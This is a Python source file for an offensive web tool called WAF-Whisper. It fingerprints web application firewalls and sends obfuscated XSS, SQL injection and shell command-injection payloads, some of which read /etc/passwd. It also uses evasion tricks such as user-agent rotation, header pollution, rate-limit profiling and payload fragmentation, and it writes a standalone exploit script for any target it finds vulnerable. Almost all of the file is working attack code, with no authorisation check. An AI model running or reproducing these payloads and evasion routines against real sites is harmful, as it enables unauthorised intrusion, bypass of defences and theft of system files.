
#!/usr/bin/env python3

import requests
import argparse
import sys
import urllib3
import time
import random
from urllib.parse import quote
import os 
import pathlib
import re # For payload manipulation
import json # <<< NEW ADDITION: Needed for PoC formatting >>>

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
RED = '\033[1;31m'
YELLOW = '\033[1;33m'
RESET = '\033[0m'
BOLD = '\033[1m'

# New global list to store bypass and potential vulnerability details
SUCCESSFUL_BYPASSES = [] 
# Global to store the discovered rate limit delay
GLOBAL_SLEEP_DELAY = 0.5 
# Global to store the discovered maximum payload length
MAX_PAYLOAD_LENGTH = 1000 
# Global Proxy Dictionary
PROXIES = {} 

def print_banner():
    banner = r"""
  _    _  ___   ______  _    _  _   _  _____  _____ ______  _____ ______  
 | |  | |/ _ \ |  ___|| |  | || | | ||_   __|/   ___|| ___ \|  ___|| ___ \
 | |  | / /_\ \| |_   | |  | || |_| |  | |  \ `--. | |_/ /| |__  | |_/ /
 | |/\| |  _  ||  _|  | |/\| ||  _  |  | |   `--. \|  __/ |  __| |    / 
 \  /\  / | | || |    \  /\  /| | | | _| |_ /\__/ /| |    | |___ | |\ \ 
  \/  \/\_| |_/\_|     \/  \/ \_| |_/ \___/ \____/ \_|    \____/ \_| \_|
"""
    print(f"{CYAN}{banner}{RESET}")
    print(f"{YELLOW}    [+] Created by: R00t3dbyFa17h/Kr0n0s510{RESET}")
    print(f"{CYAN}    ------------------------------------------------{RESET}\n")

# User Agent Rotation List (Guardrail-Ghost Concept)
GHOST_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
]

def get_emulation_headers(url, ghost_mode=False):
    domain = url.split('//')[-1].split('/')[0]
    
    # Rotate UA if Ghost Mode is on
    if ghost_mode:
        selected_ua = random.choice(GHOST_AGENTS)
    else:
        selected_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    return {
        'User-Agent': selected_ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': f'https://{domain}/',
        'DNT': '1', 
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }


def check_waf(url, headers_ua):
    print(f"{BOLD}[*] Engaging Ghost Mode on {url}...{RESET}")
    time.sleep(1) 
    
    waf_signatures = {
        'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status', 'server: cloudflare'],
        'AWS WAF': ['x-amzn-requestid', 'x-amz-id-2', 'server: awselb'],
        'Imperva Incapsula': ['x-iinfo', 'x-cdn', 'incap_ses', 'visid_incap'],
        'F5 BIG-IP': ['bigip', 'x-cnection', 'server: big-ip'],
        'Akamai': ['akamai', 'x-akamai', 'server: akamai'],
        'ModSecurity': ['mod_security', 'server: mod_security'],
        'Citrix NetScaler': ['ns_af', 'citrix_ns_id', 'server: netscaler'],
    }
    
    try:
        r = requests.get(url, headers=headers_ua, timeout=15, verify=False, proxies=PROXIES)
        all_headers = {k.lower(): v.lower() for k, v in r.headers.items()}
        cookies = r.cookies
        detected = False

        print(f"[*] Analyzing Defenses (Passive)...")

        for vendor, sigs in waf_signatures.items():
            for sig in sigs:
                if "server:" in sig:
                    server_sig = sig.split(":")[1].strip()
                    if "server" in all_headers and server_sig in all_headers["server"]:
                        print(f"{GREEN}[+] WAF DETECTED: {vendor}{RESET}")
                        detected = True
                        break 
                else:
                    for h_key in all_headers:
                        if sig in h_key:
                            print(f"{GREEN}[+] WAF DETECTED: {vendor} (Found Header: {h_key}){RESET}")
                            detected = True
                            break
        if not detected:
            print(f"{YELLOW}[-] No specific vendor signature found (Generic WAF possible){RESET}")
    except Exception as e:
        print(f"{RED}[!] Connection failed: {e}{RESET}")

def send_payload(url, payload, headers_in, description, method="GET"):
    try:
        request_headers = headers_in.copy()
        separator = "&" if "?" in url else "?"
        target_full = f"{url}{separator}q={payload}"
        
        if method == "GET":
            r = requests.get(target_full, headers=request_headers, timeout=10, verify=False, proxies=PROXIES)
        elif method == "POST":
            data_to_send = {"q": payload} if payload != "N/A" else {}
            r = requests.post(url, data=data_to_send, headers=request_headers, timeout=10, verify=False, proxies=PROXIES)
        
        code = r.status_code
        
        if code == 403 or code == 406:
            status = f"{RED}BLOCKED{RESET}"
        elif code == 200 or code in [404, 405, 500, 501]:
            if code == 200:
                status = f"{GREEN}BYPASSED{RESET}"
            else:
                status = f"{YELLOW}ALLOWED (App Error){RESET}"
            
            SUCCESSFUL_BYPASSES.append({
                "type": description, 
                "method": method, 
                "payload": payload, 
                "url": r.url,
                "code": code,
                "headers": request_headers # Store headers for PoC generation
            })
        else:
            status = f"{YELLOW}{code}{RESET}"
            
        print(f"{description:<25} | {status:<25} | {code}")
        time.sleep(0.3)
        return r 
    except:
        print(f"{description:<25} | {RED}ERROR{RESET}            | -")
        return None

def test_bypass(url, headers_ua):
    print(f"\n{BOLD}[*] Whispering Payload Variants (Active Evasion Test)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    base_payload = "<script>alert(1)</script>"
    
    mutations = {
        "Original Payload": base_payload,
        "URL Encoded": quote(base_payload),
        "Double URL Encoded": quote(quote(base_payload)),
        "Case Variation": "<ScRiPt>alert(1)</sCrIpT>",
        "Comment Obfuscation": "<script/-->alert(1)</script>",
        "Null Byte Injection": "<script%00>alert(1)</script>"
    }

    for name, payload in mutations.items():
        send_payload(url, payload, headers_ua, name)

    try:
        send_payload(url, base_payload, headers_ua, "Method: POST", method="POST")
    except:
        pass

    try:
        trust_headers = headers_ua.copy()
        trust_headers['Referer'] = url
        trust_headers['Origin'] = url
        send_payload(url, quote(base_payload), trust_headers, "Referer Spoofing")
        
        google_headers = headers_ua.copy()
        google_headers['Referer'] = "https://www.google.com"
        send_payload(url, quote(base_payload), google_headers, "Google Referer")
    except:
        pass

    try:
        json_headers = headers_ua.copy()
        json_headers['Content-Type'] = 'application/json'
        send_payload(url, base_payload, json_headers, "Content-Type Confusion", method="POST")
    except:
        pass

def test_protocol_fuzz(url, headers_ua):
    print(f"\n{BOLD}[*] Initiating HTTP Protocol Abuse Tests (Fuzzing/Header Pollution)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    base_payload = "' OR 1=1 --"

    hhp_headers = headers_ua.copy()
    hhp_headers['X-Forwarded-For'] = '127.0.0.1' 
    hhp_headers['X-Forwarded-For'] = base_payload 
    
    send_payload(url, base_payload, hhp_headers, "Header Pollution (XFF)")

    te_headers = headers_ua.copy()
    te_headers['Transfer-Encoding'] = ' chunked' 
    
    try:
        r = requests.post(url, data=f"q={base_payload}", headers=te_headers, timeout=10, verify=False, proxies=PROXIES)
        code = r.status_code
        status = f"{GREEN}BYPASSED{RESET}" if code == 200 else (f"{RED}BLOCKED{RESET}" if code in [403, 406] else f"{YELLOW}ALLOWED (App Error){RESET}")
        print(f"Transfer Encoding Abuse | {status:<25} | {code}")
    except:
        print(f"Transfer Encoding Abuse | {RED}ERROR{RESET}            | -")

    zsh_payload = f"`echo bHM`" 
    send_payload(url, zsh_payload, headers_ua, "Zsh Command Injection")


def test_stateful_sequence(url, headers_ua):
    print(f"\n{BOLD}[*] Launching Stateful, Multi-Request Sequence...{RESET}")
    
    sqli_payload_part1 = "admin"
    sqli_payload_part2 = "' --"
    
    print(f"{CYAN}{'STEP':<25} | {'ACTION':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    with requests.Session() as s:
        s.headers.update(headers_ua)
        s.verify = False
        s.proxies.update(PROXIES)

        try:
            r1 = s.get(url, timeout=10)
            print(f"1. Session Establishment | {GREEN}OK ({len(s.cookies)} cookies){RESET:<12} | {r1.status_code}")
            
            r2 = s.post(f"{url}/login", data={"username": sqli_payload_part1}, timeout=10)
            print(f"2. Low-Risk POST (F1) | {YELLOW}Sent Fragment 1{RESET:<12} | {r2.status_code}")
            time.sleep(1) 
            
            full_payload = f"user{sqli_payload_part2}" 
            r3 = s.get(f"{url}?id={quote(full_payload)}", timeout=10)
            
            code = r3.status_code
            if code == 403 or code == 406:
                status = f"{RED}BLOCKED{RESET}"
            elif code == 200:
                status = f"{GREEN}BYPASSED{RESET}"
            else:
                status = f"{YELLOW}ALLOWED (App Error){RESET}"

            print(f"3. Final Injection GET | {status:<25} | {code}")

        except Exception as e:
            print(f"Stateful Sequence | {RED}ERROR: {e}{RESET} | -")

def probe_for_vulnerability(url, headers_ua):
    print(f"\n{BOLD}[*] Launching Adaptive Vulnerability Probes (Targeting POST/200 Bypasses)...{RESET}")
    print(f"{CYAN}{'VULN TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    time_based_payload = "test_param=' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --" 
    
    start_time = time.time()
    r_time = send_payload(
        url, 
        time_based_payload, 
        headers_ua, 
        "Time-Based SQLi", 
        method="POST"
    )
    end_time = time.time()
    
    if r_time and (end_time - start_time) > 4: 
        print(f"{'Time-Based SQLi':<25} | {GREEN}VULNERABILITY DETECTED (5s Delay){RESET:<25} | {r_time.status_code if r_time else '-'}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL: Time-Based SQLi", 
            "method": "POST", 
            "payload": time_based_payload, 
            "url": url,
            "code": r_time.status_code if r_time else 'N/A',
            "headers": headers_ua
        })
    else:
        print(f"{'Time-Based SQLi':<25} | {YELLOW}NO VULNERABILITY DETECTED{RESET:<25} | {r_time.status_code if r_time else '-'}")


    cmd_payload = "cmd_param=' && echo 'INJECTED_CMD_SUCCESS' && '" 
    json_headers = headers_ua.copy()
    json_headers['Content-Type'] = 'application/json'

    r_cmd = send_payload(
        url, 
        cmd_payload, 
        json_headers, 
        "Content-Type Cmd Inj", 
        method="POST"
    )

    if r_cmd and "INJECTED_CMD_SUCCESS" in r_cmd.text:
        print(f"{'Content-Type Cmd Inj':<25} | {GREEN}VULNERABILITY DETECTED{RESET:<25} | {r_cmd.status_code}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL: Content-Type Cmd Inj", 
            "method": "POST", 
            "payload": cmd_payload, 
            "url": url,
            "code": r_cmd.status_code,
            "headers": json_headers
        })
    else:
        print(f"{'Content-Type Cmd Inj':<25} | {YELLOW}NO VULNERABILITY DETECTED{RESET:<25} | {r_cmd.status_code if r_cmd else '-'}")

def test_vulnerability_verification(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 5: COMMAND INJECTION VERIFICATION (Exploitation Test)...{RESET}")
    
    verification_payload = "param=' && cat /etc/passwd && '" 
    verification_description = "CMD Injection /etc/passwd"
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'
    
    response = send_payload(
        url, 
        verification_payload, 
        successful_headers, 
        verification_description, 
        method="POST"
    )
    
    if response and response.status_code == 200 and "root:x:0:0:root" in response.text:
        print(f"{GREEN}[+] COMMAND INJECTION CONFIRMED: '/etc/passwd' file contents detected!{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL: CMD INJECTION CONFIRMED", 
            "method": "POST", 
            "payload": verification_payload, 
            "url": response.url,
            "code": response.status_code,
            "headers": successful_headers
        })
    elif response and response.status_code == 200:
        print(f"{YELLOW}[?] Bypass successful (200 OK), but /etc/passwd output not visible (Blind Injection confirmed).{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL: BLIND CMD INJECTION (200 OK)", 
            "method": "POST", 
            "payload": verification_payload, 
            "url": response.url,
            "code": response.status_code,
            "headers": successful_headers
        })
    elif response and response.status_code in [403, 406]:
        print(f"{RED}[!] Verification payload blocked by WAF. Payload too long or new signature triggered.{RESET}")
    else:
        print(f"{YELLOW}[-] Verification failed or resulted in application error ({response.status_code if response else 'N/A'}).{RESET}")


def test_rate_limit_profile(url, headers_ua, manual_delay=None):
    global GLOBAL_SLEEP_DELAY
    
    if manual_delay is not None:
        print(f"\n{BOLD}[*] Phase 4a: Manual Delay Override Active ({manual_delay}s)...{RESET}")
        GLOBAL_SLEEP_DELAY = manual_delay
        return

    print(f"\n{BOLD}[*] Phase 4a: Profiling WAF Rate Limits (Finding RPM threshold)...{RESET}")
    
    delays = [6, 2, 1, 0.5, 0.25]
    safe_delay = 0.5
    
    for delay in delays:
        rpm = 60 / delay
        print(f"  Testing at {rpm:.0f} RPM (Delay: {delay}s)...")
        
        block_count = 0
        for _ in range(5):
            try:
                r = requests.get(url, headers=headers_ua, timeout=7, verify=False, proxies=PROXIES) 
                
                if r.status_code in [403, 429]: 
                    block_count += 1
                
            except requests.exceptions.ReadTimeout:
                block_count += 1 
                print(f"{RED}  [!] Timeout detected at {delay}s delay. WAF is actively delaying/blocking high speed.{RESET}")
            except requests.exceptions.RequestException:
                pass 
            
            time.sleep(delay)
        
        if block_count > 2:
            safe_delay = delays[delays.index(delay) - 1] if delays.index(delay) > 0 else delay * 2
            GLOBAL_SLEEP_DELAY = safe_delay * 1.5 
            print(f"{RED}[!] WAF blocked at {rpm:.0f} RPM. Setting Low-and-Slow delay to {GLOBAL_SLEEP_DELAY:.2f}s.{RESET}")
            return
            
    GLOBAL_SLEEP_DELAY = 0.5 
    print(f"{GREEN}[+] Rate limits appear high. Defaulting Low-and-Slow delay to {GLOBAL_SLEEP_DELAY:.2f}s.{RESET}")


def test_subtractive_fuzz(url, headers_ua):
    print(f"\n{BOLD}[*] Phase 4b: Subtractive Payload Fuzz (Signature Inversion)...{RESET}")
    
    base_payload = "<script>alert(1)</script>"
    
    r_initial = requests.get(f"{url}?q={quote(base_payload)}", headers=headers_ua, timeout=10, verify=False, proxies=PROXIES)
    if r_initial.status_code not in [403, 406]:
        print(f"{YELLOW}[!] Base payload not blocked. Skipping Subtractive Fuzz.{RESET}")
        return

    print(f"[*] Analyzing blocking signatures of: {base_payload}")
    
    temp_payload = base_payload
    for char in ['S', 'C', 'R', 'I', 'P', 'T', 'A', 'L', 'E', 'R', 'T']:
        if char.lower() in temp_payload.lower():
            test_payload = re.sub(char, char.lower(), temp_payload, flags=re.IGNORECASE)
            test_payload = test_payload.replace('<', '%3c').replace('>', '%3e') 
            
            r_test = requests.get(f"{url}?q={test_payload}", headers=headers_ua, timeout=10, verify=False, proxies=PROXIES)
            time.sleep(GLOBAL_SLEEP_DELAY) 
            
            if r_test.status_code not in [403, 406]:
                print(f"{GREEN}[+] Signature Pinpoint: WAF allows: {test_payload[:30]}...{RESET}")
                SUCCESSFUL_BYPASSES.append({
                    "type": "Subtractive Bypass (Signature Inversion)", 
                    "method": "GET", 
                    "payload": test_payload, 
                    "url": r_test.url, 
                    "code": r_test.status_code,
                    "headers": headers_ua
                })
                return

    print(f"{YELLOW}[-] Subtractive Fuzz did not find a simple signature bypass.{RESET}")


def test_payload_length_discovery(url, headers_ua):
    global MAX_PAYLOAD_LENGTH
    print(f"\n{BOLD}[*] Phase 6a: Maximum Payload Length Discovery (Defeating Length Filters)...{RESET}")
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'
    
    min_len = 100
    max_len = 8000
    block_status = 403
    current_len = max_len
    
    while max_len - min_len > 100:
        test_payload = "A" * current_len
        try:
            r = requests.post(url, data={"q": test_payload}, headers=successful_headers, timeout=5, verify=False, proxies=PROXIES)
            
            if r.status_code != block_status:
                print(f"  [+] Allowed at {current_len} bytes. Trying larger...")
                min_len = current_len
                current_len = (max_len + current_len) // 2
            else:
                print(f"{RED}  [!] Blocked at {current_len} bytes. Trying smaller...{RESET}")
                max_len = current_len
                current_len = (min_len + current_len) // 2
            
            time.sleep(GLOBAL_SLEEP_DELAY)

        except requests.exceptions.RequestException:
            current_len = (min_len + current_len) // 2
            time.sleep(GLOBAL_SLEEP_DELAY)
    
    MAX_PAYLOAD_LENGTH = min_len - 50 
    if MAX_PAYLOAD_LENGTH < 100: MAX_PAYLOAD_LENGTH = 100
    print(f"{GREEN}[+] Discovered Maximum Safe Payload Length (MPL): {MAX_PAYLOAD_LENGTH} bytes.{RESET}")


def test_post_fragmentation_attack(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 6b: POST FRAGMENTATION ATTACK (Defeating Complexity Filters)...{RESET}")
    
    large_command = "cmd=' && cat /etc/passwd | tail -n 5 && '" 
    
    if len(large_command) < MAX_PAYLOAD_LENGTH:
        print(f"{YELLOW}[!] Command is already smaller than MPL ({MAX_PAYLOAD_LENGTH} bytes). Skipping fragmentation.{RESET}")
        return

    chunk_size = MAX_PAYLOAD_LENGTH - 50 
    command_chunks = [large_command[i:i + chunk_size] for i in range(0, len(large_command), chunk_size)]
    
    print(f"[*] Splitting command into {len(command_chunks)} chunks (MPL: {MAX_PAYLOAD_LENGTH})...")

    with requests.Session() as s:
        s.headers.update(headers_ua)
        s.verify = False
        s.headers['Content-Type'] = 'application/json' 
        s.proxies.update(PROXIES)
        
        for i, chunk in enumerate(command_chunks):
            data_to_send = {"q": f"chunk{i}_{chunk}"} 
            
            try:
                r = s.post(url, data=data_to_send, timeout=10)
                print(f"  [+] Chunk {i+1} sent (Code: {r.status_code})")
                time.sleep(GLOBAL_SLEEP_DELAY) 
                
                if i == len(command_chunks) - 1 and r.status_code == 200:
                    if "root:x:0:0" in r.text:
                         print(f"{GREEN}[+] FRAGMENTATION SUCCESS! Output detected in response.{RESET}")
                         SUCCESSFUL_BYPASSES.append({
                            "type": "CRITICAL: FRAGMENTED CMD INJECTION", 
                            "method": "POST (Fragmented)", 
                            "payload": large_command, 
                            "url": r.url, 
                            "code": r.status_code,
                            "headers": s.headers # Session headers
                        })
                         return
                    
            except requests.exceptions.RequestException as e:
                print(f"{RED}  [!] Error sending chunk {i+1}: {e}{RESET}")
                return
    
    print(f"{YELLOW}[-] Fragmentation complete, but verification output not found.{RESET}")

def test_polyglot_evasion(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 7: POLYGLOT PAYLOAD MAPPING (Defeating Keyword Filters)...{RESET}")
    print(f"{CYAN}{'EVASION TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json' 

    polyglot_payload_1 = "param=' && $(printf 'c'a't')$(printf '\57')etc$(printf '\57')passwd && '"
    
    r1 = send_payload(
        url, 
        polyglot_payload_1, 
        successful_headers, 
        "Shell Var Sub Evasion", 
        method="POST"
    )
    
    if r1 and r1.status_code == 200 and "root:x:0:0" in r1.text:
        print(f"{GREEN}[+] COMMAND INJECTION (POLYGLOT 1) CONFIRMED!{RESET}")
        SUCCESSFUL_BYPASSES.append({"type": "CRITICAL: POLYGLOT CMD INJECTION 1", "method": "POST", "payload": polyglot_payload_1, "url": r1.url, "code": r1.status_code, "headers": successful_headers})
        return test_blind_verification(url, headers_ua, polyglot_payload_1)

    polyglot_payload_2 = "param=' && $(echo -n c)$(echo -n at)$IFS$((printf '\57'))etc$((printf '\57'))passwd && '"

    r2 = send_payload(
        url, 
        polyglot_payload_2, 
        successful_headers, 
        "IFS Concatenation Evasion", 
        method="POST"
    )

    if r2 and r2.status_code == 200 and "root:x:0:0" in r2.text:
        print(f"{GREEN}[+] COMMAND INJECTION (POLYGLOT 2) CONFIRMED!{RESET}")
        SUCCESSFUL_BYPASSES.append({"type": "CRITICAL: POLYGLOT CMD INJECTION 2", "method": "POST", "payload": polyglot_payload_2, "url": r2.url, "code": r2.status_code, "headers": successful_headers})
        return test_blind_verification(url, headers_ua, polyglot_payload_2)
    else:
        print(f"{YELLOW}[-] Polyglot Evasion failed. The WAF is performing deep semantic analysis on the payload.{RESET}")
        return test_blind_verification(url, headers_ua, polyglot_payload_1)


def test_blind_verification(url, headers_ua, polyglot_payload):
    print(f"\n{BOLD}[*] PHASE 7b: BLIND TIME-BASED VERIFICATION (Final Proof)...{RESET}")
    
    sleep_command = "$(printf 's'l'e'e'p') 5"
    sleep_payload = re.sub(r' && .* && ', f" && {sleep_command} && ", polyglot_payload)

    verification_description = "Blind Polyglot Proof (5s Delay)"
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'

    start_time = time.time()
    response = send_payload(
        url, 
        sleep_payload, 
        successful_headers, 
        verification_description, 
        method="POST"
    )
    end_time = time.time()
    
    delay = end_time - start_time
    
    if delay > 4.5 and response and response.status_code == 200:
        print(f"{GREEN}[+] CRITICAL SUCCESS: Command executed successfully with a {delay:.2f}s delay.{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "ULTIMATE CRITICAL: BLIND PROOF", 
            "method": "POST (Blind Proof)", 
            "payload": sleep_payload, 
            "url": response.url, 
            "code": response.status_code,
            "headers": successful_headers
        })
        return True
    else:
        print(f"{RED}[-] BLIND PROOF FAILED. Response time was {delay:.2f}s.{RESET}")
        return False


def generate_markdown_report(url):
    global SUCCESSFUL_BYPASSES
    
    if not SUCCESSFUL_BYPASSES:
        print(f"\n{YELLOW}[-] No successful bypasses or vulnerabilities found. No report generated.{RESET}")
        return

    report_dir = pathlib.Path("./WAF_Whisper_Reports")
    report_dir.mkdir(exist_ok=True)
    report_filename = report_dir / f"report_{url.replace('https://', '').replace('http://', '').split('/')[0]}_{time.strftime('%Y%m%d_%H%M%S')}.md"
    
    print(f"\n{BOLD}[*] Generating GitHub/Blog Ready Markdown Report: {report_filename}{RESET}")

    markdown_content = f"# WAF-Whisper Bypass and Vulnerability Report\n\n"
    markdown_content += f"## 🎯 Target: `{url}`\n\n"
    markdown_content += f"**Audit Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    markdown_content += f"**Tool Version:** WAF-Whisper v5.1 (PoC Enabled)\n\n"
    markdown_content += f"### 📊 Defense Profile\n"
    markdown_content += f"* **Discovered Low-and-Slow Delay:** `{GLOBAL_SLEEP_DELAY:.2f} seconds`\n"
    markdown_content += f"* **Discovered Maximum Payload Length (MPL):** `{MAX_PAYLOAD_LENGTH} bytes`\n"
    markdown_content += "## ✅ Key Findings & Successful Injections\n\n"
    
    for i, bypass in enumerate(SUCCESSFUL_BYPASSES, 1):
        is_vuln_probe = "CRITICAL" in bypass['type']
        
        markdown_content += f"### {i}. {bypass['type']}\n\n"
        markdown_content += f"| Detail | Value |\n"
        markdown_content += f"| :--- | :--- |\n"
        markdown_content += f"| **Status** | **{'VULNERABILITY DETECTED' if is_vuln_probe else 'WAF BYPASSED'}** |\n"
        markdown_content += f"| **Method** | `{bypass['method']}` |\n"
        markdown_content += f"| **Code** | `{bypass['code']}` |\n"
        markdown_content += f"| **Endpoint** | `{bypass['url']}` |\n"
        
        markdown_content += f"\n**Payload Used:**\n"
        markdown_content += f"```text\n{bypass['payload']}\n```\n\n"
        
        if not is_vuln_probe:
            markdown_content += "**WAF Rule Proposal:**\n"
            markdown_content += "> *Recommendation: Inspect requests where `Method` is `POST` OR `Content-Type` is set to `application/json` when the body does not conform to JSON standards.*\n\n"
        
    try:
        with open(report_filename, "w") as f:
            f.write(markdown_content)
        print(f"{GREEN}[+] Report saved to {report_filename}. Ready to commit via GitBash!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error writing report: {e}{RESET}")

# <<< NEW ADDITION: PoC Generator >>>
def generate_poc_file(url):
    global SUCCESSFUL_BYPASSES
    
    # Filter for CRITICAL vulnerabilities only
    critical_vulns = [b for b in SUCCESSFUL_BYPASSES if "CRITICAL" in b['type']]
    
    if not critical_vulns:
        return

    target_name = url.replace('https://', '').replace('http://', '').split('/')[0]
    poc_filename = f"exploit_{target_name}_{time.strftime('%Y%m%d')}.py"
    
    print(f"\n{BOLD}[*] CRITICAL VULNERABILITY FOUND: Generating Standalone Exploit Script ({poc_filename})...{RESET}")
    
    # We take the last (most recent/advanced) critical vulnerability found
    vuln = critical_vulns[-1]
    
    # Convert headers to string format for the python script
    # We need to ensure we don't dump the Session object, just the dict
    headers_dict = dict(vuln.get('headers', {}))
    
    poc_content = f"""#!/usr/bin/env python3
import requests
import sys

# AUTO-GENERATED EXPLOT SCRIPT by WAF-Whisper
# Target: {url}
# Type: {vuln['type']}
# Date: {time.strftime('%Y-%m-%d')}

def exploit():
    target_url = "{vuln['url']}"
    payload = "{vuln['payload']}"
    
    headers = {json.dumps(headers_dict, indent=4)}
    
    print(f"[*] Launching exploit against {{target_url}}...")
    print(f"[*] Payload: {{payload}}")
    
    try:
        if "{vuln['method']}" == "POST":
            # Payload injected into body
            data = {{"q": payload}}
            r = requests.post(target_url, data=data, headers=headers, verify=False, timeout=15)
        else:
            # GET Request
            r = requests.get(target_url, headers=headers, verify=False, timeout=15)
            
        print(f"[+] Response Code: {{r.status_code}}")
        if r.status_code == 200:
            print("[+] Success! Check response body below:")
            print("-" * 50)
            print(r.text[:500] + "...") # Print first 500 chars
            print("-" * 50)
        else:
            print("[-] Exploit might have failed or been blocked.")
            
    except Exception as e:
        print(f"[!] Error: {{e}}")

if __name__ == "__main__":
    exploit()
"""
    try:
        with open(poc_filename, "w") as f:
            f.write(poc_content)
        print(f"{GREEN}[+] Exploit script generated successfully: {poc_filename}{RESET}")
        print(f"{YELLOW}    Usage: python3 {poc_filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Failed to generate PoC script: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(description="WAF Whisper - Stealth WAF Detector & Evasion Tool")
    
    parser.add_argument("-u", "--url", "--target", dest="url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-p", "--proxy", dest="proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--delay", dest="delay", type=float, help="Manual override for Low-and-Slow delay (seconds)")
    parser.add_argument("--ghost", action="store_true", help="Enable Guardrail-Ghost Mode (Randomized UA Rotation)")
    
    args = parser.parse_args()
    
    target = args.url
    if not target.startswith("http"):
        target = "http://" + target

    if args.proxy:
        global PROXIES
        PROXIES = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"{YELLOW}[*] Proxy Enabled: {args.proxy}{RESET}")

    # Phase 0: INITIAL CLIENT EMULATION SETUP
    ua = get_emulation_headers(target, ghost_mode=args.ghost)
    
    print_banner() 
        
    # Phase 1: Passive/Active Fingerprinting
    check_waf(target, ua)
    
    # Phase 2: Standard Single-Request Evasion Tests
    test_bypass(target, ua)

    # Phase 3: UNIQUE Next-Gen Evasion Tests
    test_protocol_fuzz(target, ua)
    test_stateful_sequence(target, ua)
    
    # --- PHASE 4: SUBTRACTIVE-ADAPTIVE ORCHESTRATOR (SAO) ---
    test_rate_limit_profile(target, ua, manual_delay=args.delay) 
    
    test_subtractive_fuzz(target, ua)   
    
    # Phase 5: Adaptive Vulnerability Probe (Detection)
    probe_for_vulnerability(target, ua)

    # Phase 6: CRITICAL EXPLOITATION VERIFICATION 
    test_vulnerability_verification(target, ua) 
    test_payload_length_discovery(target, ua)   
    test_post_fragmentation_attack(target, ua)  
    
    # Phase 7: FINAL SEMANTIC EVASION
    test_polyglot_evasion(target, ua) 

    # Phase 8: Reporting & PoC Generation
    generate_markdown_report(target)
    # <<< NEW ADDITION: PoC Trigger >>>
    generate_poc_file(target)

if __name__ == "__main__":
    main()
